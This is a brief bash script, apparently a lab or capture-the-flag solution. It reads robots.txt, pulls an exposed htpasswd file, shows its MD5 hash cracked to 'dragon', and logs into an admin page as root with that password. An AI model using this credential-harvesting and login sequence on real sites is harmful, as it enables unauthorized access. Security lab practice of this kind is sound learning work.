#!/bin/bash
curl "http://$IP/robots.txt" -v 
curl "http://$IP/whatever/" -v 
curl "http://$IP/whatever/htpasswd" -v 

echo "8621ffdbc5698829397d97767ac13db3 MD5 : dragon"

curl "http://$IP/admin/" --data "username=root&password=dragon&Login=Login"
